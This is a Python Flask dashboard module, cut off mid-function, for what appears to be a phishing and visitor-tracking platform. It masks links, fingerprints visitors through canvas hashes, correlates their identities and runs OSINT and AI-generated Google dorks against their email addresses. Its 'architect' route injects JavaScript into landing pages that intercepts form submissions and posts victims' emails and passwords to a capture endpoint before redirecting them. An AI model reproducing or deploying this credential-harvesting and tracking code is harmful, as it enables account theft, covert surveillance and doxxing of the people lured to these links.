from flask import Blueprint, render_template, request, redirect, flash, send_file, url_for, make_response
from flask_login import login_required, current_user
import hashlib

def md5_filter(s):
    if not s: return ""
    return hashlib.md5(s.lower().encode('utf-8')).hexdigest()

import io
import segno
import os
from PIL import Image
import json

from ..models import Link, Visit, Lead
from ..extensions import db, log_queue
from ..config import Config
from ..utils import generate_slug, shorten_with_isgd
from ..ai_engine import ai

bp = Blueprint('dashboard', __name__, url_prefix='/dashboard')

# ... (End of file appends)

# V40 AI Dorking
@bp.route('/lead/<int:lead_id>/dork', methods=['POST'])
@login_required
def generate_dorks(lead_id):
    from flask import redirect, url_for, flash
    lead = Lead.query.get_or_404(lead_id)
    
    # Generate Dorks
    try:
        dorks_text = ai.generate_dorks(lead.email)
        
        # Save to custom_fields
        import json
        cf = json.loads(lead.custom_fields or '{}')
        cf['dorks'] = dorks_text
        lead.custom_fields = json.dumps(cf)
        db.session.commit()
        
        flash("AI Dorks Generated Successfully", "success")
    except Exception as e:
        flash(f"AI Error: {str(e)}", "error")
        
    return redirect(url_for('dashboard.lead_profile', lead_id=lead_id))
bp.add_app_template_filter(md5_filter, 'md5')

@bp.route('/')
@bp.route('')
@login_required
def dashboard_home():
    print(f"DEBUG: Accessing Dashboard Home BP. User: {current_user.id}")
    try:
        links = Link.query.order_by(Link.created_at.desc()).all()
        total_clicks = Visit.query.count()
        total_blocked = Visit.query.filter_by(is_suspicious=True).count()
        
        return render_template('dashboard.html', 
                              links=links, 
                              total_links=len(links), 
                              total_clicks=total_clicks,
                              total_blocked=total_blocked,
                              server_url=Config.SERVER_URL)
    except Exception as e:
        print(f"DASHBOARD ERROR: {e}")
        return f"Dashboard Error: {e}", 500

@bp.route('/create', methods=['POST'])
@login_required
def create_link():
    dest = request.form.get('destination')
    slug = request.form.get('slug')
    
    if not dest:
        flash('Destination required', 'error')
        return redirect(url_for('dashboard.dashboard_home'))
    if not slug:
        slug = generate_slug()
    if Link.query.filter_by(slug=slug).first():
        flash('Slug exists', 'error')
        return redirect(url_for('dashboard.dashboard_home'))

    new_link = Link(
        destination=dest, 
        slug=slug, 
        block_bots=request.form.get('block_bots') == 'true', 
        block_vpn=request.form.get('block_vpn') == 'true',
        enable_captcha=request.form.get('enable_captcha') == 'true',
        require_email=request.form.get('require_email') == 'true',
        email_policy=request.form.get('email_policy', 'all')
    )
    
    if request.form.get('mask_url'):
         full_url = f"{Config.SERVER_URL}/{slug}"
         masked = shorten_with_isgd(full_url)
         if masked: new_link.public_masked_url = masked

    db.session.add(new_link)
    db.session.commit()
    flash(f'Link created: /{slug}', 'success')
    return redirect(url_for('dashboard.dashboard_home'))

@bp.route('/create_full', methods=['GET', 'POST'])
@login_required
def create_full():
    """Full link creation form with all options."""
    if request.method == 'POST':
        dest = request.form.get('destination')
        slug = request.form.get('slug')
        
        if not dest:
            flash('Destination required', 'error')
            return redirect(url_for('dashboard.create_full'))
        if not slug:
            slug = generate_slug()
        if Link.query.filter_by(slug=slug).first():
            flash('Slug exists', 'error')
            return redirect(url_for('dashboard.create_full'))
        
        new_link = Link(
            destination=dest,
            slug=slug,
            block_bots=request.form.get('block_bots') == 'true',
            block_vpn=request.form.get('block_vpn') == 'true',
            block_adblock=request.form.get('block_adblock') == 'true',
            enable_captcha=request.form.get('enable_captcha') == 'true',
            require_email=request.form.get('require_email') == 'true',
            email_policy=request.form.get('email_policy', 'all'),
            ios_url=request.form.get('ios_url') or None,
            android_url=request.form.get('android_url') or None,
            safe_url=request.form.get('safe_url') or None,
            allowed_countries=request.form.get('allowed_countries') or None,
            schedule_start_hour=int(request.form.get('schedule_start_hour')) if request.form.get('schedule_start_hour') else None,
            schedule_end_hour=int(request.form.get('schedule_end_hour')) if request.form.get('schedule_end_hour') else None,
            schedule_timezone=request.form.get('schedule_timezone') or 'UTC',
            max_clicks=int(request.form.get('max_clicks') or 0),
            expiration_minutes=int(request.form.get('expiration_minutes') or 0)
        )
        
        # Password
        if request.form.get('password'):
            import hashlib
            new_link.password_hash = hashlib.sha256(request.form.get('password').encode()).hexdigest()
        
        # Mask URL
        if request.form.get('mask_link'):
            full_url = f"{Config.SERVER_URL}/{slug}"
            masked = shorten_with_isgd(full_url)
            if masked: new_link.public_masked_url = masked
        
        db.session.add(new_link)
        db.session.commit()
        flash(f'Link created: /{slug}', 'success')
        return redirect(url_for('dashboard.dashboard_home'))
    
    return render_template('create_full.html', server_url=Config.SERVER_URL)

@bp.route('/delete/<int:id>', methods=['POST'])
@login_required
def delete_link(id):
    link = Link.query.get(id)
    if link:
        Visit.query.filter_by(link_id=link.id).delete()
        db.session.delete(link)
        db.session.commit()
        flash('Link deleted', 'success')
    return redirect(url_for('dashboard.dashboard_home'))

@bp.route('/edit/<slug>', methods=['GET', 'POST'])
@login_required
def edit_link(slug):
    """Edit an existing link."""
    link = Link.query.filter_by(slug=slug).first_or_404()
    
    if request.method == 'POST':
        link.destination = request.form.get('destination')
        link.ios_url = request.form.get('ios_url') or None
        link.android_url = request.form.get('android_url') or None
        link.safe_url = request.form.get('safe_url') or None
        link.block_bots = request.form.get('block_bots') == 'true'
        link.block_vpn = request.form.get('block_vpn') == 'true'
        link.block_adblock = request.form.get('block_adblock') == 'true'
        link.allow_no_js = request.form.get('allow_no_js') == 'true'
        link.enable_captcha = request.form.get('enable_captcha') == 'true'
        link.require_email = request.form.get('require_email') == 'true'
        link.email_policy = request.form.get('email_policy', 'all')
        link.allowed_countries = request.form.get('allowed_countries') or None
        link.schedule_start_hour = int(request.form.get('schedule_start_hour')) if request.form.get('schedule_start_hour') else None
        link.schedule_end_hour = int(request.form.get('schedule_end_hour')) if request.form.get('schedule_end_hour') else None
        link.schedule_timezone = request.form.get('schedule_timezone') or 'UTC'
        link.max_clicks = int(request.form.get('max_clicks') or 0)
        link.expiration_minutes = int(request.form.get('expiration_minutes') or 0)
        
        # Password
        new_pass = request.form.get('password')
        if new_pass and new_pass != '***':
            import hashlib
            link.password_hash = hashlib.sha256(new_pass.encode()).hexdigest()
        
        # Regenerate mask
        if request.form.get('regenerate_mask'):
            full_url = f"{Config.SERVER_URL}/{link.slug}"
            masked = shorten_with_isgd(full_url)
            if masked: link.public_masked_url = masked
        
        db.session.commit()
        flash('Link updated.', 'success')
        return redirect(url_for('dashboard.stats', slug=link.slug))
    
    return render_template('edit.html', link=link, server_url=Config.SERVER_URL)

@bp.route('/contacts', methods=['GET', 'POST'])
@login_required
def contacts():
    if request.method == 'POST':
        email = request.form.get('email')
        name = request.form.get('name')
        notes = request.form.get('notes')
        
        if email:
            existing = Lead.query.filter_by(email=email).first()
            if not existing:
                new_lead = Lead(email=email, name=name, notes=notes)
                db.session.add(new_lead)
                db.session.commit()
                flash(f'Lead {email} added.', 'success')
            else:
                 flash('Lead already exists.', 'warning')
        return redirect(url_for('dashboard.contacts'))

    leads = Lead.query.order_by(Lead.created_at.desc()).all()
    return render_template('contacts.html', leads=leads)

# ============================================
# V35: IDENTITY MERGE
# ============================================

@bp.route('/merge_candidates')
@login_required
def merge_candidates():
    """Find potential duplicate leads based on canvas hash correlation."""
    # Find all emails with canvas hashes
    from collections import defaultdict
    
    hash_to_emails = defaultdict(set)
    visits = Visit.query.filter(Visit.canvas_hash != None, Visit.email != None).all()
    
    for v in visits:
        hash_to_emails[v.canvas_hash].add(v.email)
    
    # Find hashes with multiple emails (potential same person)
    merge_candidates = []
    for canvas_hash, emails in hash_to_emails.items():
        if len(emails) > 1:
            leads = Lead.query.filter(Lead.email.in_(list(emails))).all()
            if len(leads) > 1:
                merge_candidates.append({
                    'canvas_hash': canvas_hash[:16],
                    'leads': leads
                })
    
    return render_template('merge_candidates.html', candidates=merge_candidates)

@bp.route('/merge_leads', methods=['POST'])
@login_required
def merge_leads():
    """Merge multiple leads into one primary lead."""
    primary_id = request.form.get('primary_id')
    secondary_ids = request.form.getlist('secondary_ids')
    
    if not primary_id or not secondary_ids:
        flash('Select a primary lead and at least one secondary.', 'error')
        return redirect(url_for('dashboard.merge_candidates'))
    
    primary = Lead.query.get(int(primary_id))
    if not primary:
        flash('Primary lead not found.', 'error')
        return redirect(url_for('dashboard.merge_candidates'))
    
    merged_count = 0
    for sec_id in secondary_ids:
        secondary = Lead.query.get(int(sec_id))
        if secondary and secondary.id != primary.id:
            # Transfer visits
            Visit.query.filter_by(email=secondary.email).update({'email': primary.email})
            
            # Merge data
            if secondary.name and not primary.name:
                primary.name = secondary.name
            if secondary.holehe_data and not primary.holehe_data:
                primary.holehe_data = secondary.holehe_data
            if secondary.tags:
                existing_tags = set((primary.tags or '').split(','))
                new_tags = set(secondary.tags.split(','))
                primary.tags = ', '.join(existing_tags.union(new_tags))
            
            # Merge custom_fields
            import json
            try:
                primary_cf = json.loads(primary.custom_fields or '{}')
                secondary_cf = json.loads(secondary.custom_fields or '{}')
                for k, v in secondary_cf.items():
                    if k not in primary_cf:
                        primary_cf[k] = v
                primary.custom_fields = json.dumps(primary_cf)
            except: pass
            
            # Delete secondary
            db.session.delete(secondary)
            merged_count += 1
    
    db.session.commit()
    flash(f'Merged {merged_count} leads into {primary.email}.', 'success')
    return redirect(url_for('dashboard.lead_profile', lead_id=primary.id))

@bp.route('/contacts/export_csv')
@login_required
def export_contacts_csv():
    import csv
    from io import StringIO
    
    si = StringIO()
    cw = csv.writer(si)
    cw.writerow(['ID', 'Email', 'Name', 'Tags', 'Notes', 'Socials Found', 'Created At'])
    
    leads = Lead.query.all()
    for l in leads:
        count_socials = 0
        if l.holehe_data:
            try: count_socials = len(json.loads(l.holehe_data))
            except: pass
            
        cw.writerow([l.id, l.email, l.name or '', l.tags or '', l.notes or '', count_socials, l.created_at])
        
    output = make_response(si.getvalue())
    output.headers["Content-Disposition"] = "attachment; filename=contacts_export.csv"
    output.headers["Content-type"] = "text/csv"
    return output

@bp.route('/lead/<int:lead_id>', methods=['GET', 'POST'])
@login_required
def lead_profile(lead_id):
    lead = Lead.query.get_or_404(lead_id)
    if request.method == 'POST':
        lead.name = request.form.get('name')
        lead.notes = request.form.get('notes')
        lead.tags = request.form.get('tags') # Save tags
        db.session.commit()
        flash('Profile updated.', 'success')
        return redirect(url_for('dashboard.lead_profile', lead_id=lead_id))
        
    import json
    holehe_list = []
    if lead.holehe_data:
        try: holehe_list = json.loads(lead.holehe_data)
        except: pass
        
    # --- Identity Graph Logic (Spiderweb) ---
    visits = Visit.query.filter_by(email=lead.email).all()
    devices = set()
    ips = set()
    canvas_hashes = set()
    
    for v in visits:
        if v.ai_summary: devices.add(v.ai_summary)
        if v.webgl_renderer and v.webgl_renderer != "Unknown": devices.add(v.webgl_renderer)
        if v.ip_address: ips.add(v.ip_address)
        if v.canvas_hash: canvas_hashes.add(v.canvas_hash)
        
    # Find Related Leads (Shared IP or Canvas)
    related_leads = []
    if ips or canvas_hashes:
        # Complex query: Find visits that match IP or Canvas, but have different Email
        # This is heavy, so we limit to last 100 or specific matches.
        # Optimized: query distinct emails from visits where IP in ips OR canvas in hashes
        query = db.session.query(Visit.email).filter(
            (Visit.ip_address.in_(ips)) | (Visit.canvas_hash.in_(canvas_hashes)),
            Visit.email.isnot(None),
            Visit.email != lead.email
        ).distinct()
        
        related_emails = [r[0] for r in query.all()]
        if related_emails:
            related_leads = Lead.query.filter(Lead.email.in_(related_emails)).all()

    # V31: OSINT Enrichment Data
    from ..utils import email_permutations, get_gravatar_profile
    permutations = email_permutations(lead.email)
    gravatar_data = get_gravatar_profile(lead.email)
    
    # Parse custom_fields for AI identity
    ai_identity = None
    gaia_id = None
    blackbird_data = None
    try:
        cf = json.loads(lead.custom_fields or '{}')
        ai_identity = cf.get('ai_identity')
        gaia_id = cf.get('gaia_id')
        blackbird_data = cf.get('blackbird')
        dorks = cf.get('dorks')
    except:
        pass

    return render_template('profile.html', 
                          lead=lead, 
                          holehe_list=holehe_list, 
                          devices=list(devices),
                          related_leads=related_leads,
                          ips=list(ips),
                          canvas_hashes=list(canvas_hashes),
                          timeline_visits=visits,
                          permutations=permutations,
                          gravatar_data=gravatar_data,
                          ai_identity=ai_identity,
                          gaia_id=gaia_id,
                          blackbird_data=blackbird_data,
                          dorks=dorks)

@bp.route('/qr/<slug>')
@login_required
def qr_code_img(slug):
    """Generate QR Code image dynamic."""
    link = Link.query.filter_by(slug=slug).first_or_404()
    import segno
    import io
    from flask import send_file
    
    # Get params
    scale = int(request.args.get('scale', 10))
    color = '#' + request.args.get('color', '000000').replace('#','')
    bg = '#' + request.args.get('bg', 'ffffff').replace('#','')
    
    # Ensure server url
    server_url = Config.SERVER_URL or request.host_url.rstrip('/')
    dest_url = f"{server_url}/{slug}"
    
    qr = segno.make(dest_url, error='h')
    out = io.BytesIO()
    qr.save(out, kind='png', scale=scale, dark=color, light=bg)
    out.seek(0)
    
    return send_file(out, mimetype='image/png')

@bp.route('/analyze_email', methods=['POST'])
@login_required
def analyze_email():
    email = request.form.get('email')
    if not email: return "No email", 400
    if not email: 
        flash('No email provided.', 'error')
        return redirect('/dashboard/contacts')
    
    lead = Lead.query.filter_by(email=email).first()
    if not lead:
        lead = Lead(email=email)
        db.session.add(lead)
    
    lead.scan_status = 'pending'
    db.session.commit()
    
    log_queue.put({'type': 'osint', 'email': email, 'lead_id': lead.id})
    flash('Scan started.', 'success')
    return redirect(url_for('dashboard.lead_profile', lead_id=lead.id))

@bp.route('/analyze_identity/<int:lead_id>', methods=['POST'])
@login_required
def analyze_identity(lead_id):
    """V31: Trigger AI Identity Inference for a lead."""
    lead = Lead.query.get_or_404(lead_id)
    log_queue.put({'type': 'identity_inference', 'lead_id': lead_id})
    flash('AI Identity Analysis queued. Refresh in a few seconds.', 'success')
    return redirect(url_for('dashboard.lead_profile', lead_id=lead_id))

# ============================================
# V32: GLOBAL TIMELINE & SEARCH
# ============================================

@bp.route('/timeline')
@login_required
def global_timeline():
    """V32: Global Timeline - All visits across all links."""
    from datetime import datetime, timedelta
    
    # Get filter params
    q = request.args.get('q', '').strip()
    country = request.args.get('country', '')
    device = request.args.get('device', '')
    days = int(request.args.get('days', 7))
    
    # Base query
    query = Visit.query
    
    # Date filter
    if days > 0:
        cutoff = datetime.utcnow() - timedelta(days=days)
        query = query.filter(Visit.timestamp >= cutoff)
    
    # Search filter
    if q:
        search = f"%{q}%"
        query = query.filter(
            db.or_(
                Visit.ip_address.ilike(search),
                Visit.email.ilike(search),
                Visit.hostname.ilike(search),
                Visit.org.ilike(search),
                Visit.city.ilike(search),
                Visit.canvas_hash.ilike(search),
                Visit.etag.ilike(search)
            )
        )
    
    # Country filter
    if country:
        query = query.filter(Visit.country == country)
    
    # Device filter
    if device:
        query = query.filter(Visit.device_type == device)
    
    visits = query.order_by(Visit.timestamp.desc()).limit(200).all()
    
    # Get unique countries and devices for filters
    all_countries = db.session.query(Visit.country).distinct().all()
    all_devices = db.session.query(Visit.device_type).distinct().all()
    
    return render_template('timeline.html',
                          visits=visits,
                          q=q,
                          country=country,
                          device=device,
                          days=days,
                          countries=[c[0] for c in all_countries if c[0]],
                          devices=[d[0] for d in all_devices if d[0]])

# ============================================
# V47: UNIFIED AI CONSOLE WITH @MENTIONS
# ============================================

@bp.route('/ai/console')
@login_required
def ai_console():
    """Unified AI console with @mention context system."""
    # Get stats
    leads_with_ai = Lead.query.filter(Lead.custom_fields.like('%ai_identity%')).all()
    leads_pending = Lead.query.filter(
        db.or_(
            Lead.custom_fields == None,
            Lead.custom_fields == '{}',
            ~Lead.custom_fields.like('%ai_identity%')
        )
    ).all()
    
    recent_leads = Lead.query.order_by(Lead.created_at.desc()).limit(10).all()
    
    return render_template('ai_console.html',
                          analyzed_count=len(leads_with_ai),
                          pending_count=len(leads_pending),
                          recent_leads=recent_leads)

@bp.route('/ai/console/send', methods=['POST'])
@login_required
def ai_console_send():
    """Process AI message with @mention context parsing."""
    import re
    import json as json_lib
    
    message = request.form.get('message', '')
    
    if not message:
        return json_lib.dumps({'error': 'No message'}), 400
    
    if not Config.GEMINI_API_KEY:
        return json_lib.dumps({'error': 'GEMINI_API_KEY not configured'}), 500
    
    try:
        from google import genai
        client = genai.Client(api_key=Config.GEMINI_API_KEY)
        
        # === PARSE @MENTIONS ===
        context_data = ""
        
        # @email:xxx
        email_match = re.search(r'@email:(\S+)', message)
        if email_match:
            email = email_match.group(1)
            lead = Lead.query.filter_by(email=email).first()
            if lead:
                visits = Visit.query.filter_by(email=email).all()
                countries = list(set([v.country for v in visits if v.country]))
                devices = list(set([v.device_type for v in visits if v.device_type]))
                
                context_data += f"""
\n=== LEAD CONTEXT: {email} ===
Name: {lead.name or 'Unknown'}
Tags: {lead.tags or 'None'}
Total Visits: {len(visits)}
Countries: {', '.join(countries) or 'None'}
Devices: {', '.join(devices) or 'None'}
OSINT Data: {lead.holehe_data or 'None'}
Custom Fields: {lead.custom_fields or 'None'}
"""
            else:
                context_data += f"\n⚠️ Email {email} not found in database.\n"
        
        # @hash:xxx
        hash_match = re.search(r'@hash:(\S+)', message)
        if hash_match:
            hash_id = hash_match.group(1)
            visits = Visit.query.filter(
                db.or_(
                    Visit.canvas_hash == hash_id,
                    Visit.etag == hash_id
                )
            ).all()
            
            if visits:
                emails = list(set([v.email for v in visits if v.email]))
                ips = list(set([v.ip_address for v in visits if v.ip_address]))
                
                context_data += f"""
\n=== FINGERPRINT CONTEXT: {hash_id} ===
Total Visits: {len(visits)}
Emails Used: {', '.join(emails) or 'Anonymous'}
IP Addresses: {', '.join(ips)}
First Seen: {visits[0].timestamp if visits else 'N/A'}
"""
            else:
                context_data += f"\n⚠️ Fingerprint {hash_id} not found.\n"
        
        # @visit:xxx
        visit_match = re.search(r'@visit:(\d+)', message)
        if visit_match:
            visit_id = int(visit_match.group(1))
            visit = Visit.query.get(visit_id)
            if visit:
                context_data += f"""
\n=== VISIT CONTEXT: #{visit_id} ===
IP: {visit.ip_address}
Location: {visit.city or 'Unknown'}, {visit.country or 'Unknown'}
Device: {visit.device_type}, OS: {visit.os_family}
Email: {visit.email or 'Anonymous'}
Organization: {visit.org or 'Unknown'}
Canvas Hash: {visit.canvas_hash or 'None'}
Timestamp: {visit.timestamp}
"""
            else:
                context_data += f"\n⚠️ Visit #{visit_id} not found.\n"
        
        # @db:xxx - Direct SQL query (read-only)
        db_match = re.search(r'@db:(.+)', message)
        if db_match:
            query = db_match.group(1).strip()
            # Security: only allow SELECT
            if not query.lower().strip().startswith('select'):
                context_data += "\n⚠️ Only SELECT queries allowed for security.\n"
            else:
                try:
                    from sqlalchemy import text
                    result = db.session.execute(text(query))
                    if result.returns_rows:
                        rows = [dict(row) for row in result.mappings()]
                        context_data += f"\n=== DATABASE QUERY RESULT ===\n{str(rows[:20])}\n"  # Limit 20
                    else:
                        context_data += "\n=== DATABASE QUERY ===\nQuery executed (no rows returned)\n"
                except Exception as e:
                    context_data += f"\n⚠️ SQL Error: {str(e)}\n"
        
        # Build final prompt
        system_context = """You are a cybersecurity intelligence analyst expert. 
Help analyze data and identify patterns. Be concise but insightful."""
        
        full_prompt = f"{system_context}\n{context_data}\n\nUser Question: {message}"
        
        # Call AI
        response = client.models.generate_content(
            model=Config.GEMINI_MODEL,
            contents=full_prompt
        )
        
        return json_lib.dumps({
            'response': response.text,
            'model': Config.GEMINI_MODEL
        })
        
    except Exception as e:
        return json_lib.dumps({'error': str(e)}), 500

# Legacy routes redirect to console
@bp.route('/ai')
@login_required
def ai_dashboard():
    """Redirect to unified console."""
    return redirect(url_for('dashboard.ai_console'))

    """Redirect to unified console."""
    return redirect(url_for('dashboard.ai_console'))

@bp.route('/ai/analyze_all', methods=['POST'])
@login_required
def ai_analyze_all():
    """Queue AI analysis for all pending leads."""
    leads_pending = Lead.query.filter(
        db.or_(
            Lead.custom_fields == None,
            Lead.custom_fields == '{}',
            ~Lead.custom_fields.like('%ai_identity%')
        )
    ).all()
    
    for lead in leads_pending:
        log_queue.put({'type': 'identity_inference', 'lead_id': lead.id})
    
    flash(f'Queued {len(leads_pending)} leads for AI analysis.', 'success')
    return redirect(url_for('dashboard.ai_dashboard'))

@bp.route('/ai/auto_tag', methods=['POST'])
@login_required
def ai_auto_tag():
    """V33: Trigger AI Auto-Tagging for a lead."""
    lead_id = request.form.get('lead_id')
    if lead_id:
        log_queue.put({'type': 'ai_auto_tag', 'lead_id': int(lead_id)})
        flash('AI Auto-Tagging queued.', 'success')
    return redirect(request.referrer or url_for('dashboard.ai_dashboard'))

@bp.route('/ai/auto_tag_all', methods=['POST'])
@login_required
def ai_auto_tag_all():
    """Queue AI auto-tagging for all leads."""
    leads = Lead.query.all()
    for lead in leads:
        log_queue.put({'type': 'ai_auto_tag', 'lead_id': lead.id})
    flash(f'Queued {len(leads)} leads for AI auto-tagging.', 'success')
    return redirect(url_for('dashboard.ai_dashboard'))

# ============================================
# V36: AI CHAT
# ============================================

    """AI Chat interface for conversational analysis."""
    return render_template('ai_chat.html')

@bp.route('/settings', methods=['GET', 'POST'])
@login_required
def settings():
    if request.method == 'POST':
        import os
        env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
        
        # Read current env
        env_lines = []
        if os.path.exists(env_path):
            with open(env_path, 'r') as f:
                env_lines = f.readlines()
        
        # Update values
        updates = {
            'API_KEY': request.form.get('api_key'),
            'SERVER_URL': request.form.get('server_url'),
            'HOLEHE_CMD': request.form.get('holehe_cmd'),
            'GEMINI_MODEL': request.form.get('gemini_model'),
            'GEMINI_API_KEY': request.form.get('gemini_key'),
            'AI_PROMPT': request.form.get('ai_prompt', '').replace('\n', '\\n')
        }
        
        # Update or add each key
        for key, value in updates.items():
            if value:
                found = False
                for i, line in enumerate(env_lines):
                    if line.startswith(f'{key}='):
                        env_lines[i] = f'{key}={value}\n'
                        found = True
                        break
                if not found:
                    env_lines.append(f'{key}={value}\n')
        
        # Write back
        try:
            with open(env_path, 'w') as f:
                f.writelines(env_lines)
            flash('Settings saved to .env. Restart server to apply changes.', 'success')
        except Exception as e:
            flash(f'Error writing .env: {e}', 'error')
        
    return render_template('settings.html', 
                          api_key=Config.API_KEY, 
                          server_url=Config.SERVER_URL,
                          gemini_model=Config.GEMINI_MODEL,
                          gemini_key=Config.GEMINI_API_KEY,
                          ai_prompt=Config.AI_PROMPT,
                          holehe_cmd=Config.HOLEHE_CMD)

@bp.route('/qr_view/<slug>')
@login_required
def qr_view(slug):
    link = Link.query.filter_by(slug=slug).first_or_404()
    return render_template('qr_view.html', link=link, server_url=Config.SERVER_URL)

@bp.route('/stats/<slug>')
@login_required
def stats(slug):
    link = Link.query.filter_by(slug=slug).first_or_404()
    
    # Calculate Stats
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).all()
    
    # Chart Data (Last 7 days)
    from datetime import datetime, timedelta
    from collections import defaultdict
    
    now = datetime.utcnow()
    dates = [(now - timedelta(days=i)).strftime('%Y-%m-%d') for i in range(6, -1, -1)]
    clicks_map = defaultdict(int)
    
    for v in visits:
        d = v.timestamp.strftime('%Y-%m-%d')
        clicks_map[d] += 1
        
    chart_values = [clicks_map[d] for d in dates]
    
    # Top Countries
    countries = defaultdict(int)
    for v in visits: countries[v.country or 'Unknown'] += 1
    top_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]
    
    # Referrers
    referrers = defaultdict(int)
    for v in visits: referrers[v.referrer or 'Direct'] += 1
    top_referrers = sorted(referrers.items(), key=lambda x: x[1], reverse=True)[:5]

    # V29: IP Cross-Link View (Find IPs that visited OTHER links too)
    ip_addresses = list(set([v.ip_address for v in visits if v.ip_address]))
    cross_link_data = {}
    if ip_addresses:
        cross_visits = Visit.query.filter(
            Visit.ip_address.in_(ip_addresses),
            Visit.link_id != link.id
        ).all()
        
        for cv in cross_visits:
            ip = cv.ip_address
            if ip not in cross_link_data:
                cross_link_data[ip] = []
            # Avoid duplicates
            if cv.link.slug not in [x['slug'] for x in cross_link_data[ip]]:
                cross_link_data[ip].append({
                    'slug': cv.link.slug,
                    'timestamp': cv.timestamp,
                    'email': cv.email
                })

    return render_template('stats.html', 
                          link=link, 
                          visits=visits[:100], # Limit log to 100
                          chart_labels=dates,
                          chart_values=chart_values,
                          top_countries=top_countries,
                          top_referrers=top_referrers,
                          cross_link_data=cross_link_data)

@bp.route('/device/<fingerprint>')
@login_required
def device_profile(fingerprint):
    """V29: Device Cluster Page - View all activity from a specific fingerprint."""
    
    # Find all visits matching this fingerprint (canvas_hash OR etag)
    visits = Visit.query.filter(
        db.or_(
            Visit.canvas_hash == fingerprint,
            Visit.etag == fingerprint
        )
    ).order_by(Visit.timestamp.desc()).all()
    
    if not visits:
        flash('No device found with that fingerprint.', 'error')
        return redirect(url_for('dashboard.dashboard_home'))
    
    # Aggregate data
    emails = list(set([v.email for v in visits if v.email]))
    ips = list(set([v.ip_address for v in visits if v.ip_address]))
    links_visited = list(set([v.link.slug for v in visits]))
    countries = list(set([v.country for v in visits if v.country]))
    devices = list(set([f"{v.os_family} / {v.device_type}" for v in visits]))
    
    # Best identity guess
    primary_email = emails[0] if emails else None
    ai_summary = next((v.ai_summary for v in visits if v.ai_summary), None)
    webgl = next((v.webgl_renderer for v in visits if v.webgl_renderer), None)
    
    return render_template('device_profile.html',
                          fingerprint=fingerprint,
                          visits=visits[:50],
                          emails=emails,
                          ips=ips,
                          links_visited=links_visited,
                          countries=countries,
                          devices=devices,
                          primary_email=primary_email,
                          ai_summary=ai_summary,
                          webgl=webgl,
                          total_visits=len(visits))

# ============================================
# V30: EXPORT FUNCTIONALITY
# ============================================

@bp.route('/export/<slug>/json')
@login_required
def export_json(slug):
    """Export link stats as JSON."""
    link = Link.query.filter_by(slug=slug).first_or_404()
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).all()
    
    data = {
        'link': {
            'slug': link.slug,
            'destination': link.destination,
            'created_at': link.created_at.isoformat(),
            'total_visits': len(visits)
        },
        'visits': []
    }
    
    for v in visits:
        data['visits'].append({
            'id': v.id,
            'timestamp': v.timestamp.isoformat(),
            'ip_address': v.ip_address,
            'hostname': v.hostname,
            'isp': v.isp,
            'org': v.org,
            'city': v.city,
            'country': v.country,
            'lat': v.lat,
            'lon': v.lon,
            'os_family': v.os_family,
            'device_type': v.device_type,
            'user_agent': v.user_agent,
            'screen_res': v.screen_res,
            'timezone': v.timezone,
            'browser_language': v.browser_language,
            'is_suspicious': v.is_suspicious,
            'email': v.email,
            'canvas_hash': v.canvas_hash,
            'etag': v.etag,
            'webgl_renderer': v.webgl_renderer,
            'ai_summary': v.ai_summary,
            'cpu_cores': v.cpu_cores,
            'ram_gb': v.ram_gb
        })
        
    import json
    response = make_response(json.dumps(data, indent=2))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=stats_{slug}.json'
    return response

# ============================================
# V38: AI ARCHITECT (Custom Landing Pages)
# ============================================

@bp.route('/architect')
@login_required
def architect():
    links = Link.query.order_by(Link.created_at.desc()).all()
    return render_template('architect.html', links=links)

@bp.route('/architect/process', methods=['POST'])
@login_required
def architect_process():
    """Process custom HTML with auto-injection."""
    import re
    from flask import jsonify
    
    link_id = request.form.get('link_id')
    custom_html = request.form.get('custom_html')
    auto_inject = request.form.get('auto_inject') == 'true'
    
    if not link_id or not custom_html:
        return jsonify({'error': 'Missing data'}), 400
    
    link = Link.query.get(link_id)
    if not link:
        return jsonify({'error': 'Link not found'}), 404
    
    detected_fields = []
    processed_html = custom_html
    
    if auto_inject:
        if re.search(r'<input[^>]*type=["']email["']', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Email input detected')
        if re.search(r'<input[^>]*type=["']password["']', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Password input detected')
        if re.search(r'<form', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Form detected')
        
        injection_script = """
<script>
const VISIT_ID = "{{ visit_id }}";
function getCanvasHash() {
    try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillText("ulrTrack", 2, 15);
        return canvas.toDataURL().substring(0, 32);
    } catch(e) { return null; }
}
(function() {
    navigator.sendBeacon('/api/beacon', JSON.stringify({
        visit_id: VISIT_ID,
        canvas_hash: getCanvasHash(),
        screen_res: window.screen.width + 'x' + window.screen.height
    }));
})();
window.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = form.querySelector('input[type="email"]')?.value;
            const password = form.querySelector('input[type="password"]')?.value;
            fetch('/api/capture_credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({visit_id: VISIT_ID, email: email, password: password})
            }).then(() => window.location.href = "{{ destination }}")
              .catch(() => window.location.href = "{{ destination }}");
        });
    });
});
</script>
"""
        if '</body>' in processed_html:
            processed_html = processed_html.replace('</body>', injection_script + '</body>', 1)
        elif '</html>' in processed_html:
            processed_html = processed_html.replace('</html>', injection_script + '</html>', 1)
        else:
            processed_html += injection_script
    
    return jsonify({'html': processed_html, 'detected_fields': detected_fields})

@bp.route('/architect/save', methods=['POST'])
@login_required
def architect_save():
    link_id = request.form.get('link_id')
    html = request.form.get('html')
    link = Link.query.get(link_id)
    from flask import jsonify
    if link:
        link.custom_html = html
        db.session.commit()
        return jsonify({'success': True})
    return jsonify({'error': 'Link not found'}), 404

@bp.route('/export/<slug>/csv')
@login_required
def export_csv(slug):
    """Export link stats as CSV (Google Sheets compatible)."""
    import csv
    from io import StringIO
    
    link = Link.query.filter_by(slug=slug).first_or_404()
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).all()
    
    si = StringIO()
    cw = csv.writer(si)
    
    # Header
    cw.writerow([
